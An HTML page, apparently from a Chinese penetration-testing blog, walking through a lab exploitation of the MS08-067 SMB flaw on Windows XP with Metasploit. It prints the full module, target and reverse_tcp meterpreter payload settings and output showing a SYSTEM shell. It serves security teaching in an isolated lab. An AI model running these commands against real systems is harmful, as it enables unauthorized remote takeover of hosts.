@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<!--Copyright©QingSword.COM︻☼1010D>-->
+<!--Copyright©X.QingSword.COM︻☼1010D>-->
+<html lang="zh-cn">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0,minimum-scale=1.0, maximum-scale=1.0,user-scalable=no">
+	<meta name="keywords" content="晴刃,晴,qing,qingsword,ccna图文笔记,ubuntu,linux,ubuntu server,mysql,python,计算机技术博客,渗透测试,kali渗透测试,kali,kali web渗透,kali主机渗透,kali无线渗透,metasploit,白帽子测试">
+	<meta name="keywords" content="晴刃,晴,qing,qingsword,ccna图文笔记,ubuntu,linux,ubuntu server,mysql,node.js,javascript,python,计算机技术博客">
+	<meta name="author" content="x.qingsword.com">
+	<title>[Metasploit]-3-利用MS08-067漏洞获取目标主机控制权 - X.QingSword.COM</title>
+	<link rel="shortcut icon" type="image/x-icon" href="../logo/favicon.ico">
+	<link rel="stylesheet" type="text/css" href="../css/basic.css">
+	<link rel="stylesheet" type="text/css" href="../css/text.css">
+	<!-- 代码块高亮js -->
+	<link type="text/css" rel="stylesheet" href="../plugins/SyntaxHighlighter/styles/shCore.css"/>
+	<link type="text/css" rel="stylesheet" href="../plugins/SyntaxHighlighter/styles/shThemeRDark.css"/>
+	<script type="text/javascript" src="../plugins/SyntaxHighlighter/scripts/shCore.js"></script>
+	<script type="text/javascript" src="../plugins/SyntaxHighlighter/scripts/shBrushBash.js"></script>
+	<script type="text/javascript">
+	SyntaxHighlighter.all();
+	</script>
+</head>
+<body>
+	<!--header -->
+	<header id="nav">
+			<div class="nav-container"> 
+				<!-- 根大纲-->
+				<a href="http://x.qingsword.com" title="晴刃">
+					<h1 class="nav-logo">晴刃</h1>
+				</a>
+				<h2 class="nav-site-description desc-hidden">
+					He lies somewhere here
+				</h2>
+				<nav class="nav-links"> 
+					<!-- nav连接大纲-->
+					<h1 style="display:none;">网站导航</h1> 
+					<ul>
+						<li  class="active li-hidden">
+							<a href="../index.html" title="home">
+								<span class="link-word"><img src="../logo/home.png" alt="home" class="link-img">首页</span>
+							</a>
+						</li>
+						<li class="li-hidden">
+							<a href="../pt.html" title="pt">
+								<span class="link-word"><img src="../logo/linux.png" alt="pt" class="link-img">渗透<span class="word-hidden">技术</span></span>
+							</a>
+						</li>
+						<li >
+							<a href="../sitemap.html" title="sitemap">
+								<span class="link-word"><img src="../logo/archives.png" alt="archives" class="link-img"><span class="word-hidden">文章</span>归档</span>
+							</a>
+						</li>
+					</ul>
+				</nav>
+			</div>		
+	</header>
+	<!-- /header -->
+
+	<!-- content-->
+	<div id="content">
+		<div class="content-container">
+			<!-- 文章区 -->
+			<article class="text-container">
+				<header class="text-header">
+					<h1>[Metasploit]-3-利用MS08-067漏洞获取目标主机控制权</h1>	
+				</header><!-- /header -->
+				<section class="text-body">
+					<h2>引言</h2>
+					<p>这篇文章将实例演示曾经风靡一时的远程代码执行漏洞MS08-067，使用两台虚拟机作为靶机，一台WindowsXP，一台Windows2003，使用Kali2018.2作为攻击主机。</p>
+					<!-- 目录 -->
+					<h2>文章目录</h2>
+					<ul class="contents">
+						 <li><a href="#ms08-067-1">0×1.实验环境介绍</a></li>	
+						 <li><a href="#ms08-067-2">0×2.如何配置攻击Exploit</a></li>
+						 <li><a href="#ms08-067-3">0×3.如何配置Payload</a></li>
+						 <li><a href="#ms08-067-4">0×4.执行Exploit获得目标控制权</a></li>
+					 </ul>
+					<!-- /目录 -->
+
+					<!-- 正文 -->
+					<h2 id="ms08-067-1">0×1.实验环境介绍</h2>
+
+					<p>首先我们需要准备三台虚拟机，一台Kali作为攻击主机，WindowsXP与Windows2003作为目标靶机，网卡可以使用NAT模式自动分配IP地址，让三台主机能够互访即可，笔者已经将VMware的NAT模式的DHCP自动分配网段更改成了192.168.80.0/24，所以下面的实验中，三台主机都同在这个网段中，大家的NAT自动分配网段可能和笔者不同，请根据自己网络进行变通，笔者三台主机IP地址分配如下：</p>
+
+					<p class="indent-p">
+						× Kali ：192.168.80.18/24 <br>
+						× WinXP ：192.168.80.4/24 <br>
+						× Win2003 ：192.168.80.3/24
+					</p>
+
+					<p>除此之外，漏洞能够利用成功，还需要满足下面三个条件：</p>
+
+					<p class="indent-p">
+						× 在WinXP和Win2003中，确保"Computer Browser、Server、Workstation"这三个服务是开启状态（安装好后，没有进行服务优化，默认就是开启状态的）； <br>
+						×  并且系统防火墙处于关闭状态； <br>
+						× 系统未安装进程注入或内存溢出底层保护等主动安全防护软件；
+					</p>
+
+					<h2 id="ms08-067-2">0×2.如何配置攻击Exploit</h2>
+					
+					<p>Exploit的种类很多，本文所使用的Exploit通俗的讲，就是利用目标主机存在的漏洞，向目标主机发送一些代码，通过这些代码，我们能够获取目标主机内存中的一小块读写权限。</p>
+					<p>本文不会介绍太多这个漏洞底层的形成原理，简单的讲，系统启动时会通过svchost.exe宿主进程去加载的"Windows网络应用程序接口"dll组件（netapi32.dll），由于netapi32.dll文件中的函数设计出现了逻辑漏洞，所以我们可以通过构造特定的代码发送给目标主机来利用它。</p>
+
+					<p>首先，我们进入Kali，配置攻击Exploit，如下所示：</p>
+					<pre class="brush: bash;">
+					#启动msf控制台
+					root@qingsword.com:~# msfdb run
+					[+] Starting database
+
+					#如果我们忘记了ms08-067利用文件路径，可以在msf控制台中使用search命令来查找路径，然后使用use来加载它
+					msf > search ms08-067
+
+					Matching Modules
+					================
+
+					Name                                 Disclosure Date Rank   
+					----                                 --------------- ----  
+					exploit/windows/smb/ms08_067_netapi  2008-10-28      great  
+					#Name下面的这段路径，就是Metasploit主目录下，Exploit模块目录中存放ms08-067漏洞利用文件的路径，后面是这个利用文件被收录到Metasploit中的时间，以及漏洞利用文件的质量（Great）
+					
+					#如果我们很熟悉ms08_067的漏洞利用文件存放在哪，可以直接使用use来加载它，如下
+					msf > use exploit/windows/smb/ms08_067_netapi
+					msf exploit(windows/smb/ms08_067_netapi) > 
+
+					#加载了ms08_067_netapi文件后，使用下面的命令可以查看这个Exploit需要配置哪些参数
+					msf exploit(windows/smb/ms08_067_netapi) > show options 
+
+					#这个模块需要手动指定的参数有rhost（远程主机IP），以及target（远程主机系统版本），我们先指定远程主机IP，使用set来指定rhost，目标IP为WinXP的IP地址
+					msf exploit(windows/smb/ms08_067_netapi) > set rhost 192.168.80.4
+					rhost => 192.168.80.4
+
+					#然后可以使用"show target"查看这个Exploit能够攻击的目标版本
+					msf exploit(windows/smb/ms08_067_netapi) > show target
+
+					#在本系列第一篇中给出的WinXP下载连接系统版本为"Windows XP SP3 Chinese - Simplified (NX)"，版本ID是34，所以这里设置target为34
+					msf exploit(windows/smb/ms08_067_netapi) > set target 34
+					target => 34
+					</pre>
+					<p>Exploit配置完成。</p>
+
+					<h2 id="ms08-067-3">0×3.如何配置Payload</h2>
+					
+					<p>Exploit配置完成后，接下来需要配置Payload，通俗的讲Payload的功能就是，当Exploit利用成功后我们会得到能够覆盖目标主机一小块内存的权限，这一小块内存我们能够任意读写，这个时候我们可以向这块区域传一个小程序，并且让这个小程序运行在这一小块内存中，这个小程序的功能很强大，能够主动的连接到我们Kali主机，也能够开放一个端口等待我们去连接，当我们连接上后，就能够使用这个小程序去执行一些命令（比如直接在对方后台执行cmd命令等等），这个上传到目标的小程序，我们叫做Payload。</p>
+
+					<p>接着第一部分的实验，配置Payload：</p>
+					<pre class="brush: bash;">
+					#通过set payload来加载一个payload程序，本例所使用的payload为"reverse_tcp"，这个payload的功能是，当它执行后，能够从目标主机主动通过TCP协议连接到我们指定的IP地址，与我们指定的IP创建一个TCP会话，所以这个payload也叫"反向连接(reverse)payload"
+					msf exploit(windows/smb/ms08_067_netapi) > set payload windows/meterpreter/reverse_tcp
+					payload => windows/meterpreter/reverse_tcp
+
+					#查看payload需要配置哪些参数
+					msf exploit(windows/smb/ms08_067_netapi) > show options 
+
+					#在"Payload options (windows/meterpreter/reverse_tcp):"下，需要配置的参数有lhost（即目标主机执行这个payload后，会主动连接的IP地址，一般为我们用作攻击时Kali的IP地址），还有lport（即目标主机执行这个payload后，会主动连接的端口，也就是我们攻击用的Kali主机要开放哪个端口给远程目标主机来反向连接）
+					#本例在kali上开放9876这个端口给WinXP来连接，只要我们的Exploit能够成功在目标WinXP上执行，那么，传送上去的Payload执行后，就会主动的来连接Kali的9876端口，从而建立一个TCP连接，我们就能够通过这个连接来控制目标WinXP系统
+					msf exploit(windows/smb/ms08_067_netapi) > set lhost 192.168.80.18
+					lhost => 192.168.80.18
+					msf exploit(windows/smb/ms08_067_netapi) > set lport 9876
+					lport => 9876
+					</pre>
+					<p>Payload配置完成。</p>
+
+					<h2 id="ms08-067-4">0×4.执行Exploit获得目标控制权</h2>
+
+					<p>执行这个Exploit十分的简单，配置好Exploit与Payload后，通过"Exploit"或者"Run"命令，即可执行这段攻击代码：</p>
+					<pre class="brush: bash;">
+					#通过exploit命令来执行上面配置的攻击代码
+					msf exploit(windows/smb/ms08_067_netapi) > exploit 
+
+					[*] Started reverse TCP handler on 192.168.80.18:9876 
+					[*] 192.168.80.4:445 - Attempting to trigger the vulnerability...
+					[*] Sending stage (179779 bytes) to 192.168.80.4
+
+					#通过输出我们发现，向目标445端口发送了179779个字节后，我们成功的与目标建立了一个TCP连接，Kali主机的9876端口连接到了WinXP主机的一个随机端口1092，在metasploit中，这个TCP连接叫做一个"会话"（session)
+					[*] Meterpreter session 1 opened (192.168.80.18:9876 -> 192.168.80.4:1092) at 2018-08-27 15:11:53 +0800
+
+					#在攻击成功后msf的提示符也变成了meterpreter，这说明我们成功执行了payload得到了一个ShellCode
+					meterpreter > 
+
+					#这个meterpreter的功能十分强大，下面用几个简单实例来演示一下
+
+					#查看当前获得的权限（SYSTEM系统权限）
+					meterpreter > getuid
+					Server username: NT AUTHORITY\SYSTEM
+
+					#查看这个meterpreter ShellCode是工作在目标机器哪个进程里，显示目标进程PID
+					meterpreter > getpid
+					Current pid: 1036
+
+					#通过ps命令查看WinXP主机进程，可以看到1036对应了一个svchost.exe，这是Windows主机的宿主进程
+					meterpreter > ps
+					1036 664 svchost.exe x86 0 NT AUTHORITY\SYSTEM C:\WINDOWS\System32\svchost.exe
+
+					#使用shell命令，能够进入目标主机cmd命令提示符
+					meterpreter > shell
+					Process 3844 created.
+					Channel 2 created.
+					Microsoft Windows XP [版本 5.1.2600]
+					(C) 版权所有 1985-2001 Microsoft Corp.
+
+					C:\WINDOWS\system32>
+
+					#使用exit可以退出目标cmd命令提示符
+					C:\WINDOWS\system32>exit
+					exit
+
+					#通过background命令，可以挂起当前会话，回到msf命令提示符下
+					meterpreter > background 
+					[*] Backgrounding session 1...
+
+					#通过下面命令可以查看在后台运行的会话
+					msf exploit(windows/smb/ms08_067_netapi) > show sessions
+
+					  1  meterpreter x86/windows  NT AUTHORITY\SYSTEM @ 111-2C40AD98180  192.168.80.18:9876 -> 192.168.80.4:1092 (192.168.80.4)
+
+					#通过"sessions -i 会话ID号"来进入对应的会话
+					msf exploit(windows/smb/ms08_067_netapi) > sessions -i 1
+					[*] Starting interaction with 1...
+
+					meterpreter > 
+
+					#通过help命令，查看meterpreter payload下可以执行的所有命令
+					meterpreter > help
+					</pre>
+
+					<p>Ps：win2003的中文版本不存在该漏洞，通过在Exploit中"show target"大家应该也看得到，并没有中文版在攻击列表中，所以笔者在第一篇文章中提供的win2003下载连接是一个英文版，win2003的利用部分需要大家自己去实践完成，有任何疑问，可以到群里讨论分享。</p>
+
+					<p>如果通过文字还不太明白的朋友，笔者录制了这篇文章的实验视频[<a title="qingsword制作ms08-067漏洞利用" href="https://pan.baidu.com/s/19TTStmWLo5QFbejaiG-mYQ" target="_blank" rel="nofollow">点击这里</a>][提取密码：bk3z]，请使用百度网盘下载观看。</p>
+
+					<!-- /正文 -->
+
+				<footer class="text-footer">
+					<p>
+						*转载请注明来自:<a title="晴刃-自由、互助、分享、专注计算机技术。" href="http://x.qingsword.com" target="_blank">晴刃(X.QingSword.COM)</a>
+					</p>
+					<p>*原文连接:<a title="[Metasploit]-3-利用MS08-067漏洞获取目标主机控制权" href="https://x.qingsword.com/qing/Metasploit-3.html" target="_blank">https://x.qingsword.com/qing/Metasploit-3.html</a></p>
+				</footer>
+			</article>
+			<!-- /文章区 -->	
+		</div>
+	</div>
+	<!-- /content -->
+	
+	<!-- footer -->
+	<footer id="footer">
+		<div class="footer-container">
+			QingSword.COM &nbsp;<img src="../logo/by-nc-sa.png" alt="Creative Commons" title="Creative Commons">
+		</div>
+	</footer>
+	<!-- /footer -->
+</body>
+</html>
